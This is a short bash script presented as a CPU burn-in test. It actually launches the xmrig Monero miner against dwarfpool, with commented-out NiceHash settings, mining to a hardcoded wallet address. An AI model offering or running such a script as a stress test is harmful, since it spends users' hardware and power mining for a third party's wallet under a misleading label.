#!/bin/bash

#variables
#Nicehash version:
#username="15ufDkou9LJrdWTizkVTkAeXTfFC7HT13t.cputest$RANDOM"
#url="cryptonightr.usa-new.nicehash.com:3375"
#Private monero pool:
username="45ynYARcmKcLZrB1kEfjsbCcGByjVqsCnhzAgLpN1xjnTzxRRp8F7tq3bXbnrW929mdRcyBSAHNTzjHap4Wgbc8FTWRaut9.cputest$RANDOM"
url="xmr-usa.dwarfpool.com:8050"

cat /proc/cpuinfo | grep "model name" | head -1
echo $username
#echo $url
echo Burn in progress...
echo "[H] to report H/s; [Ctrl] + [C] to abort..."

#Execute CPU burn-in test
#./xmrig --algo="cn/r" --url=$url --user=$username --pass="x" --asm=auto --nicehash --donate-level=40 --print-time=500
#./xmrig --algo="cn/r" --url=$url --user=$username --pass="x" --asm=auto --nicehash --donate-level=40 --print-time=500 | grep speed
./xmrig --algo=cn/r --url=$url --user=$username --pass="x" --asm=auto --keepalive --donate-level=40 --print-time=500 | grep speed
